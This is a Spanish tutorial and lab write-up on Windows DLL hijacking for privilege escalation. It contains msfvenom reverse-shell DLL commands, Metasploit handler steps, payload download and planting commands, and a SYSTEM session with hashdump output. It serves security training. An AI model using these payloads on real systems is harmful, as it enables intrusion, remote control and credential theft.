
# DLL Hijacking

## <mark style="color:purple;">¿Qué es DLL Hijacking?</mark>

**DLL Hijacking** (secuestro de bibliotecas de enlace dinámico) es una técnica que explota el mecanismo de búsqueda de archivos DLL en Windows. Un atacante coloca una DLL maliciosa en una ubicación que el sistema busca **antes** que la DLL legítima, provocando que la aplicación cargue y ejecute el código malicioso.

#### **¿Cómo funciona?**

Cuando una aplicación necesita cargar una DLL (sin ruta completa), Windows busca en este orden:

1. Directorio desde donde se ejecutó la aplicación
2. Directorio actual del proceso
3. Directorio del sistema (`C:\Windows\System32`)
4. Directorio `C:\Windows\System`
5. Directorio `C:\Windows`
6. Directorios listados en la variable de entorno `PATH`

Si el atacante puede escribir en una ubicación que se busca **antes** que la DLL legítima (por ejemplo, el directorio de la aplicación), puede suplantar la DLL.

***

### Tipos de DLL Hijacking

* **DLL preloading**: La aplicación intenta cargar una DLL que no existe en el sistema; el atacante coloca una DLL maliciosa con ese nombre en un lugar accesible.
* **DLL replacement**: La aplicación usa una DLL legítima, pero el atacante puede sobrescribirla o colocar su versión en un directorio de búsqueda anterior.
* **DLL search order hijacking**: Manipulación de la variable de entorno `PATH` o del registro para redirigir la carga.
* **Phantom DLL**: La aplicación referencia una DLL que no está presente en el sistema; el atacante proporciona una DLL falsa con ese nombre.

***

## <mark style="color:purple;">¿Cómo explotarlo?</mark>

### **Identificar vulnerabilidades**

#### **Herramienta principal: Process Monitor (ProcMon) de Sysinternals**

1. Ejecuta la aplicación objetivo.
2. Filtra por `Operation: CreateFile` o `Load Image`.
3. Busca eventos donde el resultado sea `NAME NOT FOUND` o `PATH NOT FOUND` en ubicaciones privilegiadas.
4. Identifica DLLs que la aplicación busca pero no encuentra (en directorios donde el atacante pueda escribir).

#### **Comandos clave con ProcMon**:

* Filtro: `Process Name` contiene el nombre del ejecutable
* Filtro: `Operation` es `CreateFile`
* Filtro: `Result` es `NAME NOT FOUND`
* Filtro: `Path` termina con `.dll`

### **Crear DLL maliciosa**

Usa `msfvenom` para generar una DLL que ejecute un payload:

```bash
# DLL de 32 bits
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=4444 -f dll -o evil.dll

# DLL de 64 bits
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=4444 -f dll -o evil64.dll
```

**Opcional**: Compilar una DLL personalizada con `DllMain` para ejecutar comandos adicionales (ej. usar `system("calc.exe")`). Ejemplo en C:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            WinExec("calc.exe", SW_SHOW);
            break;
    }
    return TRUE;
}
```

### **Colocar la DLL en el lugar correcto**

* **Directorio de la aplicación**: Si tienes permisos de escritura en la carpeta donde está el ejecutable vulnerable.
* **Directorio actual** (si el usuario puede escribir allí).
* **Ruta en PATH**: Si puedes añadir un directorio a la variable de entorno `PATH` (requiere privilegios de administrador).
* **Carpeta de inicio del usuario** (a veces usada si la aplicación se ejecuta desde allí).

### **Forzar la ejecución**

* Esperar a que un administrador o servicio ejecute la aplicación.
* En algunos casos, puedes reiniciar el servicio o esperar a que se ejecute automáticamente.
* Si tienes acceso local, puedes ejecutar la aplicación tú mismo.

***

### Pasos prácticos con ejemplo

Supongamos que encontramos una aplicación llamada `vulnapp.exe` que busca `missing.dll` en su directorio y no la encuentra.

#### **Monitorear con ProcMon** (filtrado)

```powershell
Process Name: vulnapp.exe
Operation: CreateFile
Result: NAME NOT FOUND
Path: ends with .dll
```

#### **Generar DLL maliciosa**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=4444 -f dll -o missing.dll
```

#### **Subir la DLL a la máquina objetivo** (suponiendo sesión Meterpreter):

```
upload /path/to/missing.dll "C:\Program Files\Vulnerable App\missing.dll"
```

#### **Iniciar handler en Metasploit**

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.2
set LPORT 4444
run
```

#### **Ejecutar la aplicación**&#x20;

(o esperar a que se ejecute). Al cargar `missing.dll`, se ejecutará el payload y obtendrás una sesión.

***

### Comandos clave para DLL Hijacking

<table><thead><tr><th width="251.33331298828125">Acción</th><th>Comando / Herramienta</th></tr></thead><tbody><tr><td>Monitorizar búsquedas de DLL</td><td><code>procmon -accepteula</code> → filtros (Proceso, Operación, Resultado)</td></tr><tr><td>Listar DLLs faltantes</td><td><code>sigcheck -a -m</code> (Sysinternals)</td></tr><tr><td>Generar DLL payload</td><td><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll -o evil.dll</code></td></tr><tr><td>Subir archivo (Meterpreter)</td><td><code>upload /path/evil.dll C:\\Windows\\Temp\\evil.dll</code></td></tr><tr><td>Copiar DLL a directorio</td><td><code>copy evil.dll "C:\Program Files\App\"</code></td></tr><tr><td>Ejecutar aplicación</td><td><code>start /b C:\Program Files\App\vulnapp.exe</code></td></tr><tr><td>Verificar carga de DLL</td><td><code>tasklist /m evil.dll</code> o ProcMon</td></tr><tr><td>Escuchar payload</td><td><code>use exploit/multi/handler</code></td></tr></tbody></table>

***

### Herramientas adicionales

* **ProcMon**: Para detectar DLLs faltantes.
* **Process Hacker / Process Explorer**: Para ver DLLs cargadas en procesos.
* **Sigcheck**: Para verificar firmas y búsqueda de DLLs (`sigcheck -a -m app.exe`).
* **DLL Hijack Scanner** (PowerShell): Script que escanea aplicaciones para buscar DLLs faltantes.
* **PowerSploit** (Get-ProcessMitigation, etc.).
* **Metasploit** (módulos como `exploit/windows/local/dll_hijacking`).

#### **Ejemplo con PowerUp para detectar DLL Hijacking**

```bash
Import-Module .\PowerUp.ps1
Invoke-AllChecks -Check DLLHijacking
```

***

### Ejemplo con Metasploit&#x20;

#### Módulo `exploit/windows/local/dll_hijacking`

Metasploit tiene un módulo que automatiza el proceso de DLL hijacking (en sistemas con privilegios de escritura en un directorio vulnerable).

```bash
use exploit/windows/local/dll_hijacking
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.2
set LPORT 4444
set DLL_NAME missing.dll
set TARGET_PATH "C:\Program Files\Vulnerable App"
run
```

El módulo subirá la DLL maliciosa y, si la aplicación se ejecuta más tarde, obtendrá la sesión.

***

## <mark style="color:purple;">Lab - DLL Hijacking: DVTA</mark>

Se le proporciona una máquina con interfaz gráfica Kali y una máquina con Windows. Se le otorga acceso a múltiples vistas para la máquina con Windows: 1. Usuario regular (estudiante) 2. Acceso de administrador para análisis de aplicaciones.

Tu tarea consiste en encontrar la ubicación de la DLL secuestrable en la aplicación vulnerable instalada en el equipo Windows. Ejecuta [procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) para identificar las ubicaciones de las DLL faltantes y secuestrables en la aplicación vulnerable proporcionada. Luego, realiza una escalada de privilegios desde un usuario normal (estudiante) insertando una DLL maliciosa en la ruta faltante.

Nota: Utilice el equipo del estudiante para todas las actividades de escalada de privilegios. El acceso de administrador se otorga únicamente para análisis y para ejecutar aplicaciones.

Ubicación de la aplicación DVTA: C:\Users\Administrator\Desktop\dvta\bin\Release\DVTA.exe

**Objetivo**: Obtener acceso a la sesión de Meterpreter con privilegios de administrador.

#### Host

Nuestro objetivo es `demo.ine.local`:

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.9        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.41.3      attackdefense.com attackdefense
10.2.27.144    demo.ine.local
```

#### Procmon

Click derecho > Include 'CreateFile'. Eso solo nos mostrará los procesos que crean archivos:

<figure><img src="/files/fQSUskxTw3I0TAbhN2Qo" alt=""><figcaption></figcaption></figure>

#### Ejecutamos DVTA

Para analizar lo que hace en el background:

<figure><img src="/files/iPZ846CWrZxPdMo8dHAR" alt=""><figcaption></figcaption></figure>

#### Filtrar por nombre

En Procmon > `Filter > Process Name > DVTA.exe > Add > Apply`

<figure><img src="/files/VoS5GFparxZcbl9MwI89" alt=""><figcaption></figcaption></figure>

#### Filtrar por NOT FOUND

Click derecho sobre Results NOT FOUND > Include

<figure><img src="/files/ORJhRbEaDYpPXalPg1Pv" alt=""><figcaption></figcaption></figure>

Observamos una DLL `DWrite.dll` que se carga desde la ruta de Administrator, pero que no se incluye en la carpeta del ejecutable original, lo cual indica un posible DLL Hijacking:

<figure><img src="/files/EGi8DT3gykgtI2QhE5dP" alt=""><figcaption></figcaption></figure>

#### Máquina Windows atacante

Observamos que solo tenemos acceso como student sin privilegios:

```powershell
PS C:\Users\student> whoami
privilege-escal\student
PS C:\Users\student> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

#### Comprobar permisos del directorio del ejecutable

Observamos que el usuario student tiene FullControl sobre la ruta del ejecutable:

```powershell
PS C:\Users\student> Get-ACL 'C:\Users\Administrator\Desktop\dvta\bin\release' | Format-list

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\dvta\bin\release
Owner  : BUILTIN\Administrators
Group  : PRIVILEGE-ESCAL\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         PRIVILEGE-ESCAL\Administrator Allow  FullControl
         PRIVILEGE-ESCAL\student Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         PRIVILEGE-ESCAL\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:S-1-5-21-419124378-3330503463-3778973392-513D:AI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICII
         D;FA;;;S-1-5-21-419124378-3330503463-3778973392-1008)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)
```

```
PRIVILEGE-ESCAL\student Allow  FullControl
```

Eso nos permite sobreescribir el ejecutable para elevar privilegios con DLL Hijacking.

#### Generar DLL maliciosa: Msfvenom

Desde el Kali Linux generaremos el DLL con el nombre: `DWrite.dll`

<pre class="language-bash"><code class="lang-bash">┌──(root㉿attackdefense)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.3 LPORT=4444 -f dll > Dwrite.dll                                                       
<strong>
</strong><strong>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</strong>[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of dll file: 9216 bytes
</code></pre>

#### Abrir listener multi handler

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.41.3
set LPORT 4444
exploit

[*] Started reverse TCP handler on 10.10.41.3:4444 
```

#### Enviar el payload

En Kali Linux:

```bash
┌──(root㉿attackdefense)-[~]
└─# python3 -m http.server 80
                                                                                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En la máquina atacante Windows:

```powershell
iwr -UseBasicParsing -Uri http://10.10.41.3/Dwrite.dll -OutFile .\Dwrite.dll
```

Y lo copiamos a la ruta de Administrator:

```powershell
Copy-Item "C:\Users\student\Dwrite.dll" -Destination "C:\Users\Administrator\Desktop\dvta\bin\Release"
```

#### Ejecutamos DVTA

<figure><img src="/files/VwGz2BrijyTEbD9V9Zs7" alt=""><figcaption></figcaption></figure>

#### Recibimos el Meterpreter

```bash
[*] Started reverse TCP handler on 10.10.41.3:4444 
[*] Sending stage (176198 bytes) to 10.2.27.144
[*] Meterpreter session 1 opened (10.10.41.3:4444 -> 10.2.27.144:49769) at 2026-04-06 23:47:39 +0530

meterpreter > getuid
Server username: PRIVILEGE-ESCAL\Administrator

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Escalamos a SYSTEM y podemos volcar todos los hashes:

```bash
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```
